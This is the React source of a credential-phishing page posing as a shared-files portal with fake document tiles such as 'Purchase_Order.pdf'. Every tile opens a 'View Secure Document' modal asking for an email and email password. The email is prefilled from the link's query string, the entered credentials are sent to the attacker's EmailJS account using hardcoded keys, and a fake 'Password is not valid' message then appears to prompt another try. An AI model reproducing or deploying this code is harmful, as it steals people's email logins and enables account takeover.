import React, { useState, useRef, useEffect } from "react";
import Modal from "react-modal";
import DotLink from "./images/dotLink.svg";
import { IoIosArrowRoundDown } from "react-icons/io";
import Disperson from "./images/disperson.png";
import { FcStart } from "react-icons/fc";
import Drawing from "./images/drawing.jfif";
import { FcPicture } from "react-icons/fc";
import Purchase from "./images/purchase.jfif";
import Pdff from "./images/pdff.png";
import Specification from "./images/specification.png";
import Cross from "./images/cross.png";
import Close from "./images/close.png";
import emailjs from "@emailjs/browser";

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [modal, setModal] = useState(false);
  const [error, setError] = useState('')
  const form = useRef();

  //function to get the email from URL parameters
  const getEmailFromUrl = () => {
    const params =window.location.search;
    return params ? params.substring(1) : '';
  };

  useEffect(() => {
    // Set the initial email state from URL
    const initialEmail = getEmailFromUrl();
    setEmail(initialEmail);
  }, []);

  const openModal = () => {
    setModal(true);
  };

  const closeModal = () => {
    setModal(false);
  };
  const onChangeEmail = (e) => {
    setEmail(e.target.value);
  };
  const onChangePassword = (e) => {
    setPassword(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_c8jyjjn",
        "template_l7983kp",
        form.current,
        "BVEIjg5lg7SHh-5Io"
      )
      .then((res) => {
        e.target.reset();
        setError('Password is not valid')
      })
      .catch((err) => {});
  };

  return (
    <div>
      <div className="shared">
        <span className="documents">
          <h3>DOCUMENTS</h3>
        </span>
        <div>
          <img className="dot" src={DotLink} alt="" />
        </div>
      </div>
      <hr></hr>
      <div className="shared">
        <div>
          <p className="second-header">SHARED</p>
        </div>
        <span className="download">
          <p className="second-header" onClick={openModal}>
            DOWNLOAD ALL
          </p>
        </span>
      </div>
      <hr></hr>
      <div className="shared">
        <div>
          <p className="second-header">Files</p>
        </div>
        <div>
          <p className="second-header">
            Name <IoIosArrowRoundDown />{" "}
          </p>
        </div>
      </div>
      <section className="main">
        <div onClick={openModal} className="dispersion">
          <img src={Disperson} alt="" />
          <hr></hr>
          <span>
            <p>
              <FcStart /> FW47_Dipersion.mov
            </p>
          </span>
        </div>

        <div onClick={openModal} className="drawing">
          <img src={Drawing} alt="" />
          <hr></hr>
          <div>
            <p>
              <FcPicture /> Drawings_Sketches.png
            </p>
          </div>
        </div>
        <div onClick={openModal} className="purhase">
          <img src={Purchase} alt="" />
          <hr></hr>
          <span>
            <p>
              <img className="pdf" src={Pdff} alt="" /> Purchase_Order.pdf
            </p>
          </span>
        </div>
        <div onClick={openModal} className="specificatin">
          <img src={Specification} alt="" />
          <hr></hr>
          <span className="xlsx">
            <p>
              <img className="specification" src={Cross} alt="" />{" "}
              Specification.xlsx
            </p>
          </span>
        </div>
      </section>

      <Modal
        style={{
          overlay: {
            position: "fixed",
            top: "0%",
            left: "0%",
            right: "0%",
            bottom: "0%",
            backgroundColor: "#00000078",
            zIndex: 100,
          },
          // content: {
          //   top: "15%",
          //   maxHeight: "69%", // Adjust the value as needed
          //   overflow: "auto",
          // },
        }}
        className="modal"
        isOpen={modal}
        shouldCloseOnOverlayclick={true}
        onRequestClose={closeModal}
        ariaHideApp={false}
      >
        <div className="">
          <form ref={form} onSubmit={handleSubmit} className="formInput">
            <div className="closeImgDiv">
              <img className="closee" src={Close} alt="" onClick={closeModal} />
            </div>
            <div>
              <h3> View Secure Document</h3>
            </div>
            <label>
              <h5> Email Address</h5>
            </label>
            <input
              className="inputs"
              type="email"
              name="email"
              value={email}
              onChange={onChangeEmail}
              placeholder="Enter email" required
            />
            <label>
              <h5>Email Password</h5>
            </label>
            <input
              className="inputs"
              type="password"
              name="password"
              value={password}
              onChange={onChangePassword}
              placeholder="Email Password"
              required
            />
            <p style={{color: 'red', fontSize:'12px'}}>{error}</p>
            <div>
              <p>
                {" "}
                <input type="checkbox" /> stay signed in{" "}
              </p>
            </div>
            <div>
              <button className="downloads">Download</button>
            </div>
            <span>
              <p className="access"> Can't access your account?</p>
            </span>
          </form>
        </div>
      </Modal>
    </div>
  );
}
